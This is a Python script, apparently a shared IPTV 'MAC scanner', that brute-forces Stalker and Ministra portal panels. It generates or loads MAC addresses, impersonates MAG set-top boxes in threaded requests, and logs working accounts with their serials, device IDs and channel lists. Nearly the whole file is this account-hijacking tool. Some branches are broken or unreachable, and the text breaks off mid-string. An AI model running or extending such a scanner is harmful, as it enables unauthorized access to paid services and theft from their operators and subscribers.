# -*- coding: utf-8 -*-
# tittle:Cybermax-$pecialMac
# Recoded By Rizgar kurdish
# ══ نسخة مصححة (rabie-fixed v1) — 6 أخطاء أصلعتها ══
# ⚠️ استعملها على بواباتك وأرقام MAC الخاصة بك فقط
# RABIE_ROOT=مسار  لتغيير مجلد الحفظ (بدل /sdcard) 
# $pecial for Macs
# $ome Macs only can hit by this payload 
# the payload can hit any other iptv Macs 
# feature side hosts added to Hit  txt file
# $upport 25 Mac endpoints 
#Live Vod Series Categories Are vertical style 
# Working on  qpython3 and termux
#Contact: https://heylink.me/rizgarkurdish 

#windows compatability added,duplicate imports removed, bot consolidation, and http status by 🥷🏻 🅚🅘🅓 🅒🅗🅐🅞🅢 🥷🏻

import os
import datetime
import hashlib
import random,time,re                    
import requests,threading,platform
import pathlib
from datetime import date

def _pipi(args):
    try:
        import pip
        pip.main(args)
    except Exception:
        try:
            os.system("pip install " + " ".join(args))
        except Exception:
            pass

if platform.system() == "Windows":
    rootDir = "."
else:
    rootDir = os.environ.get("RABIE_ROOT") or "/sdcard"
    
try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except Exception as e:
    #print("SL4A non disponible :", e)
    ad = None
    
def clear():
    os.system("cls" if os.name == "nt" else "clear")
      
nickn="Cybermax-SpecialMac"
if nickn=="":
    nickn="Cybermax-SpecialMac"
    
try:
    os.makedirs(rootDir+"/Hits/CyberMax/",exist_ok=True)
except Exception:
    print("⚠️ ما نقدرش نكتب في /sdcard — شغل: termux-setup-storage واعطِ الإذن")
    rootDir = "."
    os.makedirs(rootDir+"/Hits/CyberMax/",exist_ok=True)

try:
    import requests
except:
    print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
    _pipi(['install', 'requests'])
try:
    import requests
except Exception:
    print("")
    print("❌ مكتبة requests ما تنسبتش.")
    print("   الحل — شغل هذو السطرين وتعاود:")
    print("   pkg install python-pip -y")
    print("   pip install requests")
    import sys
    sys.exit(1)
import requests

try:
    import socks
except:
    print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
    _pipi(['install', 'requests[socks]'] )
    _pipi(['install', 'PySocks'] )
try:
    import socks
except Exception:
    socks = None  # اختياري — غير مستعمل

try:
    from playsound import playsound#import requests
except:
    print("playsound modulu yüklü değil — yükleniyor \n")
    _pipi(['install', 'playsound'])
    
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import cfscrape
    sesq= requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses= requests.Session()
logging.captureWarnings(True)

clear()
say1=0
say2=0
say=0
bul=0
hitc=0
prox=0
cpm=0
bekleme=1
isimle=""
getmac=""        
maca=0
macv=0
white=("""\033[1;37;40m\n""")                   
oto=0
tur=0
Seri=""
csay=0
pattern= r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
rizzgar=("""
       █▀▀ █▄█ █▄▄ █▀▀ █▀█
       █▄▄ ░█░ █▄█ ██▄ █▀▄
         █▀▄▀█ ▄▀█ ▀▄▀
         █░▀░█ █▀█ █░█
         S P E C I A L   M A C
\33[0m
 \33[0;1m""")

clear()         
print(rizzgar) 
#print(len(rizzgar))

intro=("""\33[1;1m
        1= portal.php
        2= portal.php (White Cnf)
        3= portal.php (White Ultra)
        4= portal.php (Real Blue)
        5= server/load.php (Real Blue)   
        6= server/load.php
        7= stalker_portal
        8= c/server/load.php 
        9= c/portal.php 
        10= bs.msg.portal
        11= portalcc.php
        12= magload.php
        13= ministra/portal.php
        14= ministra/portal.php (realblue)
        15= portalstb/portal.php 
        16= xstalker.php 
        17= maglove/portal.php 
        18= p/portal.php 
        19= magaccess 
        20= portalmega.php
        21= extraportal
        22= portalott.php
        25= real blue             
 Select portal type = \33[0m""")
a="""Enter panel:port = """
panel = input(intro)
print('\33[0m')
speed=""
buri=""
urib=""
uzmanc=""
uzmanm2=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"               
if  panel=="" or panel=="1":
        uzmanm="portal.php"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        clear()
        print(rizzgar)
if  panel=="0":
        uzmanm=input('Yazınız=')
        useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
        clear()
        print(rizzgar) 
        panel = input(intro)
        
if  panel=="" or panel=="1":
        uzmanm="portal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="2":
        uzmanm="portal.php"
        uzmanc="portal"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="3":
        uzmanm="portal.php"
        uzmanc="ultra"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="4":
        uzmanm="portal.php"
        uzmanc="realblue"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="5":
        uzmanm="server/load.php"
        uzmanc="realblue"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
        
if panel=="6":
        uzmanm="server/load.php"
        buri="/c/"
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="7":
        uzmanm="stalker_portal/server/load.php"
        uzmanc="stalker"
        urib="/stalker_portal"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG323 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="8":
        uzmanm="c/server/load.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="9":
        uzmanm="c/portal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="10":
        uzmanm="bs.mag.portal.php"
        buri="/c/" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="11":
        uzmanm="portalcc.php"
        buri="/c/" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="12":
        uzmanm="magLoad.php"
        buri="/c/" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="13":
        uzmanm="ministra/portal.php"
        uzmanm2="/ministra"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="14":
        uzmanm="ministra/portal.php"
        uzmanm2="/ministra"
        uzmanc="realblue"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 2 rev: 250 Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="15":
        uzmanm="portalstb/portal.php"
        uzmanm2="/portalstb"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="16":
        uzmanm="xstalker.php"
        uzmanm2="/c"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="17":
        uzmanm="maglove/portal.php"
        uzmanm2="/maglove"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="18":
        uzmanm="p/portal.php"
        uzmanm2="/p"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="19":
        uzmanm="magaccess/portal.php"
        uzmanm2="/magaccess"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="20":
        uzmanm="portalmega.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="21":
        uzmanm="extraportal.php"
        buri="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
if panel=="22":
        uzmanm="portalott.php"
        uzmanm2="/c/"
        useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" 
        clear()
        print(rizzgar) 
        panel = input(a)
                                  
     
realblue=""
if panel=="25":
    realblue="real"
    clear()
    print(rizzgar) 
    panel = input(a)    
#print(panel.split('/')[3])

if bekleme=="":
    bekleme=1
else:
    bekleme=int(bekleme)
try:
    if panel.split('/')[7] =='stalker_portal':
        uzmanm="stalker_portal/server/load.php"
        panel=panel.replace('/stalker_portal','')
        uzmanc='stalker'
except:pass

#print(panel)
clear()
print(rizzgar)            
totLen="000000"
dosyaa=""
yeninesil=(
'00:1A:79:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
if "1"=="1":
    say=0
    dsy=""
    dsy="\n       \33[1;4;94;47m 0=⫸ Random (OTO MAC)  \33[0m\n"
    dir=rootDir+'/combo/'
    os.makedirs(dir, exist_ok=True)
    file=len(rizzgar)
    for files in sorted (os.listdir (dir)):
        say=say+1
        dsy=dsy+"   "+str(say)+"=⫸ "+files+'\n'
    print ("""CHOOSE YOUR COMBO FILE !!!
"""+dsy+"""
\33[33mNumber of """ +str(say)+""" combo files
    """)
    dsyno=input("Choose Your Combo Number= \33[0m")
    say=0
    
    if dsyno=="":
        dsyno="0"
    if dsyno=="0":
        clear()
        print(rizzgar) 
        
        nnesil=str(yeninesil)
        nnesil=(nnesil.count(',')+1)
        for xd in range(0,(nnesil)):
            tire='  》'
            if int(xd) <9:
                tire='   》'
            print(str(xd+1)+tire+yeninesil[xd])
        
        mactur=input("\nChoose your Mac Prefix= ")
        if mactur=="":
            mactur=14
        #print(mactur)
        try:
            mactur=yeninesil[int(mactur)-1]
        except Exception:
            mactur='00:1A:79:'
        #print(mactur)
        uz=input("""
 Number of macs to generate
  Qᴜᴀɴᴛɪᴛʏ: """)
        if uz=="":
            uz=30000
        uz=int(uz) 
        #print(uz)
    else:
        for files in sorted (os.listdir (dir)):
                say=say+1
                if dsyno==str(say):
                    dosyaa=(dir+files)
                    break
        say=0
        if not dosyaa=="":
            #print(dosyaa)
            pass
        else:
            print("Wrong combo file selection...!")
            quit()
        c=open(dosyaa, 'r', encoding='utf-8')
        totLen=c.readlines()
        uz=(len(totLen))
    
    baslama=""
    if not baslama =="":
        baslama=int(baslama)
        csay=baslama
        
        
clear()
print(rizzgar)      
botsay=input("""\33[1m
   Set the number of bots
      
 Bots: """)
if botsay=="":
    botsay=int(4)
botsay=int(botsay)

clear()
print(rizzgar)      
kanalkata="0"
kanalkata=input("""\33[1;40m
 What do you want to show in the results?
    0= Connection data only
    1= Channels only
    2= Show everything (Live vod series)
 \33[1mOption: """)
if kanalkata=="":
    kanalkata="1"
    
gsay=0
vsay=0
if panel=="" :
    panel="center.chmedia.xyz:8080"
Rhit='\33[33m' 
Ehit='\033[0m' 

panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

Dosyab=rootDir+"/Hits/CyberMax/" +panel.replace(":","_").replace('/','') +"@ Hits by CyberMax_SpecialMac.txt"

say=1
def yax(imza):
    with open(Dosyab, 'a', encoding='utf-8') as f:#dosya=open(Dosyab,'a') 
        f.write(imza)#dosya.write(imza)
    #dosya.close()  
    
def month_string_to_number(ay):
   
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
        
def tarih_clear(trh):
    #trh=tarih_exp
    ay=""
    gun=""
    yil=""
    trai=""
    my_date=""
    sontrh=""
    out=""
    ay=str(trh.split(' ')[0])
    gun=str(trh.split(', ')[0].split(' ')[1])
    yil=str(trh.split(', ')[1])
    ay=str(month_string_to_number(ay))
    #print(ay)
    trai=str(gun)+'/'+str(ay)+'/'+str(yil)
    my_date = str(trai)
    #print(my_date)
    if 1==1:
        
        d = date(int(yil), int(ay), int(gun))
        sontrh = time.mktime(d.timetuple())
        out=(int((sontrh-time.time())/86400))
        return out
    #except:pass
    
macs="" 
sayi=1
b1hitc=0
b2hitc=0

def randommac():
    try:
        genmac = str(mactur)+"%02X:%02X:%02X"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
        #print(genmac)
    except:pass
    genmac=genmac.replace(':100',':10')
    return genmac
    
url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
 
if uzmanc=="stalker":
    url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&random="+str(random.randint(100000, 999999))+"&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22"+str(random.randint(100000, 999999))+"%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
if uzmanc=="realblue":
    url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"

def url(cid):
    url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
    return url7
    
def hea1(macs):
    HEADERA={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
    if uzmanc=="portal":
        try:
            url="http://"+panel+"/c//version.js" 
            res = ses.get(url,  headers=HEADERA, timeout=15, verify=False)
            vir=str(res.text).split("'")[1].split("'")[0]
        except:pass
        
        url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=1E3A20C221DF6C3EC477C30DBEFE8F07&prehash=6b1e45cc169162c9e876a29707236e54c24631db&JsHttpRequest=1-xml"
    if uzmanc=="realblue":
        HEADERA={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
        }
    return  HEADERA
    if uzmanc=="ultra":
            HEADERA={
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":useragent , 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
            }
            url1="http://"+panel+"/"+uzmanm+"php?type=stb&action=handshake&token=&prehash=0&mac="+mac+"&JsHttpRequest=1-xml" 
    
def hea2(macs,token):
                HEADERd={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
                }
                return HEADERd
                
                if uzmanc=="ultra":
                    HEADERd={
"Authorization": "Bearer "+token,
"X-User-Agent":"Model: MAG254; Link: Ethernet,WiFi",
"User-Agent":useragent , 
"Referer":"http://"+panel+"/c/", 
"Accept":"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
"Host":panel, 
"Cookie":"PHPSESSID=null; mac="+mac+"; stb_lang=en; timezone=Europe%2FParis; adid=90315b70fdf800b5c5181de836a8ec4d", 
"Accept-Encoding":"gzip, deflate", 
"Content-Type":"text/javascript;charset=UTF-8", 
"Connection":"keep-alive", 
"X-Powered-By":"PHP/5.6.3", 
                    }
                return HEADERd
                if uzmanc=="portal":
                    url2="http://"+panel+"/portal.php?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r23-254;%20ImageDate:%20Wed%20Oct%2031%2015:22:54%20EEST%202018;%20PORTAL%20version:%20"+vir+";%20API%20Version:%20JS%20API%20version:%20343;%20STB%20API%20version:%20146;%20Player%20Engine%20version:%200x58c&num_banks=2&sn="+SNCUT+"&client_type=STB&image_version=218&video_out=hdmi&device_id="+DEVENC+"&device_id2="+DEVENC+"&signature=1275CE35F07BABFAABCBFD3AF0A94790C5B5E619D3354942BD4009F375F94CD4&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22"+SNCUT+"%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22394EF2DA299FEDEB10410611EC0D4DCC82152444EB1DFD9B86D65C35AAD584EB%22%2C%22random%22%3A%22random%22%3A%22%22%7D&hw_version_2=39d95ea1affa08953d5951afeb1fbe57f8ffc23a&timestamp=1634575872&api_signature=262&prehash=9036d5f7dc752a23dfc087de916552a2de3e70bb&JsHttpRequest=1-xml"
                                            
                if uzmanc=="realblue":
                    HEADERd={
"User-Agent":useragent ,
"Referer": "http://"+panel+"/c/" ,
"X-User-Agent": "Model: MAG250; Link: WiFi",
"Cache-Control": "no-cache",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
                    }
                return HEADER
                
def hea3():
    hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
    }
    return hea
    
hityaz=0    
    
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi):
    global hitr
    global hityaz
    try:
        imza="""
        
    
    
🔷ℂ𝕪𝕓𝕖𝕣 𝕞𝕒𝕩 𝕊𝕡𝕖𝕔𝕚𝕒𝕝 𝕄𝕒𝕔🔷
    🟥◻️☀️🟩Rê¢ðÐêÐ ß¥ Rïzgår kµrÐï§h 🟥◻️☀️🟩
❀Hits by """+nickn+""" ❀ 
╭─✮❀️❀️🅢🅣🅐🅛🅚🅔🅡 🅘🅝🅕🚫❀❀
❀❀✦ 𝖯𝖠𝖭𝖤𝖫 ✦: http://"""+str(panel)+"""/c/
❀❀✦ 𝖬𝖠𝖢 ✦: """+str(mac)+"""
❀❀✦ 𝖤𝖷𝖯𝖨𝖱𝖤𝖲 ✦: """+str(trh)+"""
❀❀✦ 𝖵𝖯𝖭 ✦: """+str(durum)+"""─ """+str(vpn)+"""
❀❀✦ 𝖲𝖭 ✦: """+SNENC+"""
❀❀✦ 𝖲𝖭𝖢𝖴𝖳 ✦: """+SNCUT+"""
❀❀✦ 𝖣𝖤𝖵𝖨𝖢𝖤 𝖨𝖣 1 ✦:
❀❀"""+DEVENC+"""
❀❀✦ 𝖣𝖤𝖵𝖨𝖢𝖤 𝖨𝖣 2 ✦:
❀❀"""+SINGENC+"""
❀❀✦ 𝖳𝖸𝖯𝖤 ✦: """+str(uzmanm)+""" """+str(playerapi)+""" """
        
        sidehost_str=sidehosts(str(real) if real else str(panel))
        if sidehost_str:
            imza=imza+"\n\n"+sidehost_str+"\n"
        if  kanalkata=="1" or kanalkata=="2":
            imza=imza+"""
 ❀❀️🅒🅗🅐🅝🅝🅔🅛 🅘🅝🅕🚫❀❀
╭─CHANNELS
"""+str(livelist)+"""\n╰─✮"""
        if kanalkata=="2":
            imza=imza+"""
╭─●🆅🅾🅳🅻🅸🆂🆃
"""+str(vodlist)+"""
╭─●🆂🅴🆁🅸🅴🆂🅻🅸🆂🆃
"""+str(serieslist)+"""
"""
        yax(imza)
        hityaz=hityaz+1
        print(imza)
        if hityaz >= hitc:
            hitr="\33[1;33m"
    except Exception as e:
        print(f"Error in hit function: {e}")
    
cpm=0
cpmx=0
color=""
hitr="\33[1;33m"
def echok(mac,bot,total,hitc,oran,tokenr,status_code):
    global cpm
    global hitr,color
    global cpmx
    try:
        cpmx=(time.time()-cpm)
        cpmx=(round(60/cpmx))
    except Exception:
        cpm=cpmx
    if str(cpmx)=="0":
        cpm=cpm
    else:
        cpm=cpmx

    if status_code==200:color="\33[1m\33[32m""Aᴠᴀɪʟᴀʙʟᴇ: "
    if status_code==301:color="\33[1m\33[1;33m""Rᴇᴅɪʀᴇᴄᴛ: "
    if status_code==302:color="\33[1m\33[1;31m""Mᴏᴠᴇᴅ Tᴇᴍᴘᴏʀᴀʀɪʟʏ: "
    if status_code==401:color="\33[1m\33[1;31m""Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ: "
    if status_code==403:color="\33[1m\33[1;31m""Fᴏʀʙɪᴅᴅᴇɴ: "
    if status_code==404:color="\33[1m\33[1;31m""Nᴏᴛ Fᴏᴜɴᴅ: "
    if status_code==429:color="\33[1m\33[1m\33[33m""Tᴏᴏ Mᴀɴʏ Rᴇqᴜᴇsᴛs: "
    if status_code==500:color="\33[1m\33[1m\33[36m""Sᴇʀᴠᴇʀ Eʀʀᴏʀ: "
    if status_code==503:color="\33[1m\33[1m\33[36m""Uɴᴀᴠᴀɪʟᴀʙʟᴇ: "
    if status_code==512:color="\33[1m\33[1m\33[36m""Eʀʀᴏʀ: "
    if status_code==520:color="\33[1m\33[35m""Cʟᴏᴜᴅꜰʟᴀʀᴇ: "
            
    echo=("""
 ❀❀█▓▒▒░░░Cyber Max Special Mac ░░░▒▒▓█❀❀
╭─●🎛✦ HTTP✦:\33[0m """+color+str(status_code)+""" \33[0m
├─●🎛✦ 𝖯𝖠𝖭𝖤𝖫✦: """+str(panel)+""" 
├─●🔍✦ 𝖲𝖢𝖠𝖭 𝖳𝖸𝖯𝖤 ✦: """+str(uzmanm)+"""     
├─●🧾✦ 𝖬𝖠𝖢𝖲 𝖳𝖮 𝖢𝖧𝖤𝖢𝖪 ✦: """+str(uz)+"""
├─●🤖✦ 𝖡𝖮𝖳 ✦: """+str(bot)+"""
├─●🍏✦ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 𝖬𝖠𝖢 ✦: """+tokenr+str(mac)+""""""+str(hitr)+"""\33[0m
